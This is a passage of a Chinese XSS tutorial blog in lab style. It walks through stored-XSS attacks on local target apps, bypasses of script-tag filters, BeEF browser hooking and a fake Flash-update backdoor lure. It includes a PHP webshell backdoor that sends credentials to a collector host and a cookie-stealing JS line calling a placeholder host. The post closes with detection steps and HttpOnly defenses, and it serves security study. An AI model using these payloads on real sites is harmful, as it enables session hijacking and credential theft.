+<li><p>第三种：允许用户输入HTML标签的页面，用户可以提交一些自定义的HTML代码。  </p>
+</li>
+</ol>
+<h1 id="五、靶场实战"><a href="#五、靶场实战" class="headerlink" title="五、靶场实战"></a>五、靶场实战</h1><h2 id="1、PHP开源多功能留言板"><a href="#1、PHP开源多功能留言板" class="headerlink" title="1、PHP开源多功能留言板"></a>1、PHP开源多功能留言板</h2><h3 id="（1）搭建靶场"><a href="#（1）搭建靶场" class="headerlink" title="（1）搭建靶场"></a>（1）搭建靶场</h3><p>PHP开源多功能留言板下载地址：<a target="_blank" rel="noopener" href="https://down.chinaz.com/soft/37581.htm">https://down.chinaz.com/soft/37581.htm</a> ，按照教程安装即可</p>
+<h3 id="（2）XSS平台"><a href="#（2）XSS平台" class="headerlink" title="（2）XSS平台"></a>（2）XSS平台</h3><ul>
+<li><p>网址1：<a target="_blank" rel="noopener" href="https://xss.pt/xss.php">https://xss.pt/xss.php</a></p>
+</li>
+<li><p>网址2：<a target="_blank" rel="noopener" href="http://xss.fbisb.com/xss.php">http://xss.fbisb.com/xss.php</a></p>
+</li>
+<li><p>网址3：<a target="_blank" rel="noopener" href="https://xss8.cc/login/">https://xss8.cc/login/</a></p>
+</li>
+<li><p>网址4：<a target="_blank" rel="noopener" href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a></p>
+</li>
+</ul>
+<h3 id="（3）进行攻击"><a href="#（3）进行攻击" class="headerlink" title="（3）进行攻击"></a>（3）进行攻击</h3><h4 id="①-初次尝试"><a href="#①-初次尝试" class="headerlink" title="① 初次尝试"></a>① 初次尝试</h4><p>尝试用简单的JS代码进行XSS攻击</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642404918490-71d694cc-f960-4f34-8cbf-c5616df235cc.png" alt="img"></p>
+<p>存在JS过滤</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642404929155-920e302c-1459-4596-b886-ad7188f5a561.png" alt="img"></p>
+<h4 id="②-绕过-lt-script-gt-检测"><a href="#②-绕过-lt-script-gt-检测" class="headerlink" title="② 绕过&lt;script&gt;检测"></a>② 绕过<code>&lt;script&gt;</code>检测</h4><p>使用以下语句绕过<code>&lt;script &gt;</code>过滤：<code>&lt;BODY onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642405435917-686249c9-c463-4db8-bc4f-e3f5a861413f.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642405450698-9e6ec365-8df2-4485-ad4c-c7bcedcb0898.png" alt="img"></p>
+<p>成功弹出弹窗</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642405475988-f071dc12-017b-4358-944e-b02923920087.png" alt="img"></p>
+<p>管理员后台查看也会弹出弹窗</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642405506341-7506bfce-c447-47fc-963c-1e13efd0d378.png" alt="img"></p>
+<p>而弹出弹窗的原因就是这句JS代码嵌入到了代码中</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642405897104-7a8492d6-0f51-4e43-b86b-f1ce645624a0.png" alt="img"></p>
+<h4 id="③-利用XSS平台获取cookie"><a href="#③-利用XSS平台获取cookie" class="headerlink" title="③ 利用XSS平台获取cookie"></a>③ 利用XSS平台获取cookie</h4><p>此时利用XSS平台，启用默认模块，因为这个留言板会过滤<code>&lt;script&gt;</code>标签，因此我选择使用img标签进行XSS攻击</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642409499063-ea3d3fac-73e7-414d-92c4-be88c250eded.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642586508015-19995ba6-3397-48b7-845f-cadb954957df.png" alt="img"></p>
+<p>发送payload成功</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642584792036-5bada630-3c06-4f4b-9920-726fc7d40a90.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642406011774-d609f930-1235-485d-a54f-37396924a974.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642584973661-11be33f6-2ccd-4c45-84b2-2b223ed87b92.png" alt="img"></p>
+<p>管理员到后台查看留言</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642584952518-40c0c2d5-9a52-4635-9d34-bcf50b78830c.png" alt="img"></p>
+<p>此时XSS平台就有记录了</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642586589851-320fd40a-6db3-4b92-a2df-062b564453c1.png" alt="img"></p>
+<h4 id="④-使用firebug登录后台"><a href="#④-使用firebug登录后台" class="headerlink" title="④ 使用firebug登录后台"></a>④ 使用firebug登录后台</h4><p>获取到访问的URL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL：http://192.168.100.120/SyGuestBook_v1.2/index.php?c=adminMessage&amp;a=ListMessage&amp;gid=1</span><br><span class="line">Cookie：valueName=w01ke; valueQq=5201314; PHPSESSID=en5mt3n1snl0hvg6d45mji2a95</span><br></pre></td></tr></table></figure>
+
+<p>用获取到的cookie和后台链接，使用firebug进行设置</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642588748924-d0e9ea87-cb78-41db-9821-9b36f1d513ea.png" alt="img"></p>
+<p>成功进入后台！</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642588777560-e0db8613-7b32-49b1-a574-644584b5467a.png" alt="img"></p>
+<p>&emsp;&emsp;注意：因为是留言板，因此别人查看我们留下的XSS攻击代码时，也会记录到XSS平台，因此查看XSS平台的记录时注意甄别访客和管理员</p>
+<h2 id="2、BUUCTF-basic-BUU-XSS-COURSE-1"><a href="#2、BUUCTF-basic-BUU-XSS-COURSE-1" class="headerlink" title="2、BUUCTF-basic-BUU XSS COURSE 1"></a>2、BUUCTF-basic-BUU XSS COURSE 1</h2><ul>
+<li>👉<a target="_blank" rel="noopener" href="https://www.yuque.com/docs/share/d0abe6d1-1669-4d83-a4d2-6fe1e82f770d">《BUUCTF-basic-BUU XSS COURSE 1》</a>👈</li>
+</ul>
+<h2 id="3、订单系统——军锋真人CS野战123"><a href="#3、订单系统——军锋真人CS野战123" class="headerlink" title="3、订单系统——军锋真人CS野战123"></a>3、订单系统——军锋真人CS野战123</h2><h3 id="（1）靶场下载"><a href="#（1）靶场下载" class="headerlink" title="（1）靶场下载"></a>（1）靶场下载</h3><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1YUKC5IIh9Kl7P9loe0p2Lg">https://pan.baidu.com/s/1YUKC5IIh9Kl7P9loe0p2Lg</a> ，提取码：rtra</p>
+<h3 id="（2）靶场安装"><a href="#（2）靶场安装" class="headerlink" title="（2）靶场安装"></a>（2）靶场安装</h3><p>注意下载安装好后仔细查看安装说明，比如config.php的数据库账密要对，否则连接不上数据库</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642580308516-a6afe0af-1855-4459-91a3-0cd6398fdc44.png" alt="img"></p>
+<p>如果访问install.php提示以下信息，按照提示操作即可</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642494006091-30d37362-f661-43d0-91cf-c370af5bc484.png" alt="img"></p>
+<p>在真实机部署环境时出现了一系列问题（后台登录页面验证码无法显示），我是在Win7虚拟机，PHP版本为5.3.29部署成功的</p>
+<h3 id="（3）进行攻击-1"><a href="#（3）进行攻击-1" class="headerlink" title="（3）进行攻击"></a>（3）进行攻击</h3><h4 id="①-初次尝试-1"><a href="#①-初次尝试-1" class="headerlink" title="① 初次尝试"></a>① 初次尝试</h4><p>攻击者在具体要求一栏构造payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642581499917-265ec4b0-571d-4613-bffb-b9fcc657973f.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642581536144-93a5edf8-855e-4cba-a597-0833bb447a18.png" alt="img"></p>
+<p>管理员在后台进行查看时就会弹出弹窗</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642581556614-2a2dd0cd-cf4e-4f9e-a2a0-1c8502afff3c.png" alt="img"></p>
+<p>正是因为我们的JS代码嵌入到了其中</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642581588656-bfc1eac5-ae2b-4dae-a96b-6138503f0a56.png" alt="img"></p>
+<h4 id="②-XSS平台获取cookie"><a href="#②-XSS平台获取cookie" class="headerlink" title="② XSS平台获取cookie"></a>② XSS平台获取cookie</h4><p>选择XSS平台的攻击代码</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642581730045-dba41c28-6995-42e1-9754-70c35d1c3b8d.png" alt="img"></p>
+<p>提交</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642581785151-e1fb52f4-f518-476f-9e8d-b1da72d0971a.png" alt="img"></p>
+<p>管理员在后台查看时就会触发攻击代码</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642581946591-6a73dfb7-f0a4-4322-a99b-bce6f7bdd1ba.png" alt="img"></p>
+<p>此时在XSS平台就能查看到获取的信息</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642582000244-7ab4ae89-b3e4-4591-8ed3-4b1d40f0c06c.png" alt="img"></p>
+<h4 id="③-postman登录后台"><a href="#③-postman登录后台" class="headerlink" title="③ postman登录后台"></a>③ postman登录后台</h4><p>postman下载地址：<a target="_blank" rel="noopener" href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642582243728-f4436c0b-5d64-4c04-8c0c-fa885ecf5e42.png" alt="img"></p>
+<h3 id="（4）Beef结合XSS攻击"><a href="#（4）Beef结合XSS攻击" class="headerlink" title="（4）Beef结合XSS攻击"></a>（4）Beef结合XSS攻击</h3><h4 id="①-安装Beef-xss"><a href="#①-安装Beef-xss" class="headerlink" title="① 安装Beef-xss"></a>① 安装Beef-xss</h4><p>最新版kali安装beef-xss</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install beef-xss</span><br></pre></td></tr></table></figure>
+
+<p>如果遇到找不到包</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643096539754-21bda98b-598d-4459-8622-1770f7d23dda.png" alt="img"></p>
+<p>解决方案</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编辑文件</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加旧的资源信息</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main contrib non-free</span><br><span class="line"><span class="meta">#</span><span class="bash"> For <span class="built_in">source</span> package access, uncomment the following line</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> deb-src http://http.kali.org/kali kali-rolling main contrib non-free</span></span><br><span class="line">deb http://http.kali.org/kali sana main non-free contrib</span><br><span class="line">deb http://security.kali.org/kali-security sana/updates main contrib non-free</span><br><span class="line"><span class="meta">#</span><span class="bash"> For <span class="built_in">source</span> package access, uncomment the following line</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> deb-src http://http.kali.org/kali sana main non-free contrib</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> deb-src http://security.kali.org/kali-security sana/updates main contrib non-free</span></span><br><span class="line">deb http://old.kali.org/kali moto main non-free contrib</span><br><span class="line"><span class="meta">#</span><span class="bash"> For <span class="built_in">source</span> package access, uncomment the following line</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> deb-src http://old.kali.org/kali moto main non-free contrib</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 更新资源列表</span></span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<p>更新完毕后重新安装目标应用即可</p>
+<p>安装完成后，直接使用beef-xss启动会有启动失败的问题，目前还不知道解决方法</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643097035828-2ddbcefa-8e70-497b-b60c-130e7dec2e83.png" alt="img"></p>
+<p>但是可以进入<code>/usr/share/beef-xss/</code>目录，使用<code>./beef</code>启动即可</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643097095455-ffd7a7f4-e346-425a-99ca-eb9e6e5f86d7.png" alt="img"></p>
+<p>如果需要修改登录账号密码可以修改config.yaml文件</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643097262651-17dcf038-1429-43e6-8cc3-62f6c2e682a1.png" alt="img"></p>
+<h4 id="②-使用beef-xss"><a href="#②-使用beef-xss" class="headerlink" title="② 使用beef-xss"></a>② 使用beef-xss</h4><p>启动beef后，插入钩子，提交</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643097866129-ca2a93fb-adaa-484d-b2a9-27c925c0fef9.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643097981740-ea8eb9fe-9686-4816-9ece-c87c3199a2d7.png" alt="img"></p>
+<p>后台管理员查看订单触发XSS</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643098123473-ff9d17eb-5a89-49b6-8147-739ebb4000b2.png" alt="img"></p>
+<p>成功上线</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643098170223-a0e5e9ab-5960-4f02-9184-ed79e9680afc.png" alt="img"></p>
+<p>获取Cookie</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643098518585-9e1894b4-af38-4572-b9b3-abcf58f21b28.png" alt="img"></p>
+<p>浏览器跳转</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643098749436-2aa796a8-72f0-4f19-9d64-965a68fe9ae3.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643098784610-7fc93af8-c9fa-48f0-b2c5-dc8214c42f45.png" alt="img"></p>
+<p>社工攻击，利用模拟Flash更新向客户端发送请求，来实现下载后门</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643099134753-5a07daab-7fa1-4c20-a0dc-fdb192c443e4.png" alt="img"></p>
+<p>客户端显示，点击就下载后门</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643099551419-bc0c0559-bf20-4c30-b85c-2cc61b5f7b23.png" alt="img"></p>
+<h2 id="4、WebShell箱子管理系统"><a href="#4、WebShell箱子管理系统" class="headerlink" title="4、WebShell箱子管理系统"></a>4、WebShell箱子管理系统</h2><p>&emsp;&emsp;就是使用别人的webshell来进行获取服务器shell，但获取shell后<strong>webshell</strong>存在的<strong>恶意代码</strong>就会把网站信息和webshell密码，和用户名发到webshell的原主人来进行<strong>信息收集</strong>，通过大量获取的网站shell来进行<strong>贩卖</strong>，而使用webshell的人就成<strong>打工仔</strong>了。</p>
+<p>&emsp;&emsp;反杀的意思就是像上面的<strong>窃取cookie</strong>道理一样通过向webshell的代码中插入窃取cookie的代码，当webshell 原注入查看沙箱时就会触发xss窃取cookie来达到<strong>反客为主</strong>！</p>
+<p>&emsp;&emsp;既然说到了WebShell，推荐一个WebShell库：<a target="_blank" rel="noopener" href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
+<h3 id="（1）搭建靶场-1"><a href="#（1）搭建靶场-1" class="headerlink" title="（1）搭建靶场"></a>（1）搭建靶场</h3><h4 id="①-靶场下载"><a href="#①-靶场下载" class="headerlink" title="① 靶场下载"></a>① 靶场下载</h4><p>靶场下载：链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ym_f9HDjejY2YLAMJmtAKA">https://pan.baidu.com/s/1ym_f9HDjejY2YLAMJmtAKA</a> </p>
+<p>提取码：gay7</p>
+<h4 id="②-小旋风下载"><a href="#②-小旋风下载" class="headerlink" title="② 小旋风下载"></a>② 小旋风下载</h4><p>&emsp;&emsp;搭建一个asp的服务器，我们这里选用小旋风进行搭建<a target="_blank" rel="noopener" href="http://lt.yx12345.com:90/yasuobao/jyx12345xiaoxuanfenglinshiaspfuwuqiminiban.zip%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%AE%8C%E6%88%90%E5%90%8E%E8%A7%A3%E5%8E%8B%E5%88%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%87%8C%E9%9D%A2">http://lt.yx12345.com:90/yasuobao/jyx12345xiaoxuanfenglinshiaspfuwuqiminiban.zip，下载完成后解压到虚拟机里面</a></p>
+<p>&emsp;&emsp;默认端口为80。如果80端口被占用或不想用80可用记事本打开host.ini增加端口网站服务</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2893488/1642592780643-1764bf55-8d20-4531-bc41-1a4c677c4af3.png" alt="img"></p>
+<h4 id="③-靶场搭建"><a href="#③-靶场搭建" class="headerlink" title="③ 靶场搭建"></a>③ 靶场搭建</h4><p>&emsp;&emsp;将下载好的webshell箱子放在搭建好的服务器里面，这里我放到了8001端口下</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642669805289-fd721f49-4fad-46cf-8206-ef3231fed691.png" alt="img"></p>
+<p>&emsp;&emsp;这里存在一个问题，访问该网址时只能访问<a target="_blank" rel="noopener" href="http://localhost:8001/xxx%EF%BC%8C%E8%AE%BF%E9%97%AE127.0.0.1%E6%88%96%E8%80%85%E5%86%85%E7%BD%91IP%E5%9C%B0%E5%9D%80%E9%83%BD%E4%BC%9A%E6%8A%A5**418">http://localhost:8001/xxx，访问127.0.0.1或者内网IP地址都会报**418</a> Host Not Found**的错误</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642670016865-06b48d0e-8286-4a3c-b18d-2fce563e0e36.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2893488/1642670036004-d215c14e-bbeb-4157-98f6-9f8735a675a6.png" alt="img"></p>
+<p>&emsp;&emsp;经过排查终于知道是哪里出了问题，只需要将这里修改成对应的IP地址，重启服务即可</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2893488/1642670201987-af395cea-a729-4284-a7c2-50fa69b26692.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642670311105-27944ed0-53b3-4523-9a0e-d173d7cb7353.png" alt="img"></p>
+<p>&emsp;&emsp;假如我们向wolke.cn传入了别人留了后门的木马，进行连接，访问了<a target="_blank" rel="noopener" href="http://10.3.14.17:8001/api.asp?url=wolke.cn&amp;pass=sqzr&amp;id=1%EF%BC%8C%E8%BF%99%E4%B8%AA%E6%97%B6%E5%80%99%E5%88%AB%E4%BA%BA%E5%9C%A8%E5%90%8E%E5%8F%B0%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0%E6%88%91%E4%BB%AC%E7%9A%84webshell%EF%BC%8C%E5%9D%90%E6%94%B6%E6%B8%94%E7%BF%81%E4%B9%8B%E5%88%A9">http://10.3.14.17:8001/api.asp?url=wolke.cn&amp;pass=sqzr&amp;id=1，这个时候别人在后台就能看到我们的webshell，坐收渔翁之利</a></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643074868151-e027a9a9-a485-4122-b713-56ed91fa0cb5.png" alt="img"></p>
+<h3 id="（2）进行攻击"><a href="#（2）进行攻击" class="headerlink" title="（2）进行攻击"></a>（2）进行攻击</h3><h4 id="①-模拟webshell原作者进行后门攻击"><a href="#①-模拟webshell原作者进行后门攻击" class="headerlink" title="① 模拟webshell原作者进行后门攻击"></a>① 模拟webshell原作者进行后门攻击</h4><p>&emsp;&emsp;登录后台（账号密码都为：admin）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642671535760-1a25ef10-8827-4ea7-a515-26c9ea604301.png" alt="img"></p>
+<p>&emsp;&emsp;去找一个免杀WebShell，然后加上我自己的后门</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="string">&quot;sqzr&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]; <span class="comment">// HTTP_HOST当前请求头中 Host: 项的内容；PHP_SELF当前执行脚本的文件名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script src=&#x27;http://10.3.14.17:8001/api.asp?url=<span class="subst">$url</span>&amp;pass=<span class="subst">$password</span>&amp;id=1&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642672998635-37fec6eb-5bfc-438a-a163-4e9b351820d4.png" alt="img"></p>
+<p>&emsp;&emsp;模拟上传WebShell到某网站，并且进行连接触发后门</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643078077076-dfd054a0-00b7-4d59-a77f-90bd82df3a67.png" alt="img"></p>
+<p>&emsp;&emsp;这时我们就打开webshell箱子发现我们的后门了（实验时发现木马路径太长，即使触发了后门也无法记录到webshell箱子中去）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643078142747-4cec5494-d3ec-4b75-a66c-6caaa203d780.png" alt="img"></p>
+<h4 id="②-反杀webshell原作者"><a href="#②-反杀webshell原作者" class="headerlink" title="② 反杀webshell原作者"></a>② 反杀webshell原作者</h4><p>&emsp;&emsp;有的webshell原作者会利用加密、编码、拼接字符等技术来隐藏URL，因此我们使用别人的webshell时一定要进行代码审计</p>
+<p>&emsp;&emsp;当我们代码审计获取到webshell沙箱的URL后，通过访问webshell沙箱来植入XSS代码窃取cookie</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643089816152-07a33c59-5664-451d-9295-8621319a6055.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643093762196-72586c8d-af4f-427e-8fb4-1db7b512fcd1.png" alt="img"></p>
+<p>&emsp;&emsp;此时沙箱管理员查看PHP信封，就会看到我们的恶意数据，同时也会触发XSS攻击代码</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643093818121-92151e61-b88d-434a-840a-440626bd2179.png" alt="img"></p>
+<p>&emsp;&emsp;XSS平台新增记录</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643094222847-673d4263-d91d-4cd0-9806-be09d077f62c.png" alt="img"></p>
+<p>&emsp;&emsp;使用postman进入后台，直接反杀</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643094461130-4c99b0e6-b633-4730-9ff7-d5528ed941b7.png" alt="img"></p>
+<h2 id="5、使用JS代码获取Cookie"><a href="#5、使用JS代码获取Cookie" class="headerlink" title="5、使用JS代码获取Cookie"></a>5、使用JS代码获取Cookie</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);img.src=<span class="string">&quot;http://xxxx/a?&quot;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);&lt;script&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="六、XSS攻击的检测"><a href="#六、XSS攻击的检测" class="headerlink" title="六、XSS攻击的检测"></a>六、XSS攻击的检测</h1><ol>
+<li><p>在目标站点上找到输入点，比如搜索栏，错误页面，留言板等。  </p>
+</li>
+<li><p>输入一组”特殊字符+唯一识别字符”，点击提交后，查看返回源码，是否做对应的处理。  </p>
+</li>
+<li><p>通过搜索定位到唯一识别字符，结合唯一识别字符前后语法确认是否可以构造执行js的条件(构造闭合)。  </p>
+</li>
+<li><p>提交构造的脚本代码以及各种绕过姿势，看是否可以成功执行，如果成功执行则说明该站点存在XSS漏洞。  </p>
+</li>
+</ol>
+<p><strong>Tips：</strong></p>
+<ol>
+<li><p>通常搜索栏容易出现反射型XSS，留言板容易出现存储型XSS；  </p>
+</li>
+<li><p>有些网站鉴于后台可能存在过滤措施，组建的script可能会被过滤掉，因而无法生效或者环境限制脚本执行；</p>
+</li>
+<li><p>通过变化不同的script，尝试绕过后台的过滤机制。</p>
+</li>
+</ol>
+<p> <strong>下图为跨站脚本攻击流程图（Cookies）</strong>  </p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626871022792-dd640019-7a60-49ab-85ce-31a2d88f30a8.png" alt="img"></p>
+<p>&emsp;&emsp;从图中可以看出：用户访问存在XSS漏洞的站点后触发脚本，漏洞站点给用户返回带有恶意js的页面；用户设备执行该恶意脚本后，攻击者即可窃取用户的数据（cookies），并伪装成用户对漏洞站点进行攻击。</p>
+<h1 id="七、获取Session思路"><a href="#七、获取Session思路" class="headerlink" title="七、获取Session思路"></a>七、获取Session思路</h1><p>&emsp;&emsp;有的时候获取了Cookie，但是少了Session，会造成登不进后台</p>
+<p>&emsp;&emsp;服务器开启了Session验证的话，我们只获取客户端的Cookie是没有办法通过验证的，</p>
+<p>&emsp;&emsp;而且我们也无法获取存放在服务端的Session</p>
+<p>&emsp;&emsp;如果需要获取Session，可以借助辅助文件，比如访问php探针时就会携带Session</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643103631251-09c4a5a7-6a09-4604-b8ef-3b1664d1f527.png" alt="img"></p>
+<p>&emsp;&emsp;如果能利用XSS让管理员页面跳转到phpinfo()界面，通过返回源码就能窃取Session</p>
+<p>&emsp;&emsp;利用beef进行页面跳转</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643105102796-2364734e-007f-4a38-90cb-0bd3b599d93f.png" alt="img"></p>
+<p>&emsp;&emsp;获取页面源码</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643105121154-1858829c-ef1a-4453-ae0e-eaeb8840c558.png" alt="img"></p>
+<p>&emsp;&emsp;获取源码中的cookie和session</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643105141117-67d9b256-2e63-4124-ac81-bd40b60ea462.png" alt="img"></p>
+<h1 id="八、HttpOnly"><a href="#八、HttpOnly" class="headerlink" title="八、HttpOnly"></a>八、HttpOnly</h1><h2 id="1、什么是HttpOnly"><a href="#1、什么是HttpOnly" class="headerlink" title="1、什么是HttpOnly"></a>1、什么是HttpOnly</h2><p>&emsp;&emsp;如果Cookie中设置了HttpOnly属性，那么通过JS脚本将无法读取到Cookie信息，这样能有效防止XSS攻击，窃取Cookie内容。 但是还是存在xss跨站语句，阻止的仅仅是获取cookie</p>
+<p>&emsp;&emsp;各个主流的脚本语言都支持HttpOnly</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643474645740-ff9bdf0a-d326-4d22-9b71-e70d98ceb157.png" alt="img"></p>
+<h2 id="2、HttpOnly的设置样例"><a href="#2、HttpOnly的设置样例" class="headerlink" title="2、HttpOnly的设置样例"></a>2、HttpOnly的设置样例</h2><h3 id="（1）JavaEE"><a href="#（1）JavaEE" class="headerlink" title="（1）JavaEE"></a>（1）JavaEE</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader(<span class="string">&quot;Set-Cookie&quot;</span>, <span class="string">&quot;cookiename=value;</span></span><br><span class="line"><span class="string">Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;具体参数的含义再次不做阐述，设置完毕后通过js脚本是读不到该cookie的，但使用如下方式可以读取</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookies[]=request.getCookies();  </span><br></pre></td></tr></table></figure>
+
